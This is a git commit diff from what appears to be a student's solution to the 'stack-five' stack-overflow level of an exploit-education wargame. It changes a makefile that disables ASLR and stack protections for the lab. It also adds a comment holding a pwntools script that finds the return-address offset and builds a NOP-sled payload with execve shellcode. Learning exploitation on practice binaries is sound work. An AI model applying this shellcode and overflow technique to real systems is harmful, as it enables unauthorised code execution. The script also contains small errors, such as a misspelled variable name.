e44d03fc6e0ca458bb72beb85af5e0057aebb258
vian21 <pigir101@uottawa.ca>
2023-11-18 11:05:37 -0500

    stack execution

--- makefile
+++ makefile
@@ -1,13 +1,18 @@
-FlAGS:=-O0 -fno-stack-protector  -z execstack -g
+FlAGS:=-O0 -fno-stack-protector -z execstack -g -no-pie
+
 compile: 
+	gcc ${FlAGS}  ${file}.c -o ${file}
+
+init:
 	@echo "Disabling ASLR"
 	@sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
 
-	gcc ${FlAGS}  ${file}.c -o ${file}
-
 clean:
 	@echo "Re-enabling ASLR"
-	@sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
+	@sudo bash -c 'echo 1 > /proc/sys/kernel/randomize_va_space'
+
+	@echo "Disabling core dumps"
+	@ulimit -c 0
 
 	@echo "Deleting executables"
 	find . -maxdepth 1 -type f -executable -delete
--- stack-five.c
+++ stack-five.c
@@ -25,3 +25,31 @@ int main(int argc, char **argv) {
   printf("%s\n", BANNER);
   start_level();
 }
+
+/**
+***** 1. Find rip offset *****
+from pwn import *
+
+io = process('./stack-five')
+
+io.recvuntil(b"\n")
+io.sendline(cyclic(500))
+io.wait()
+
+core = io.corefile
+
+stack = core.rsp
+pattern = core.read(stack, 4)
+rip_offset = cyclic_find(pattern)
+print("rip offset is %d", rip_offset)
+
+***** 2. payload and exploit *****
+buf = "\x90" * 20
+buf +="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+buf += "\x90"* (rip_offset - len(buf)) + "\x7f\xff\xff\xff\xde\xc0"[::-1]
+print buff
+
+Command: python2 exploit.py - | ./stack-five
+
+
+*/
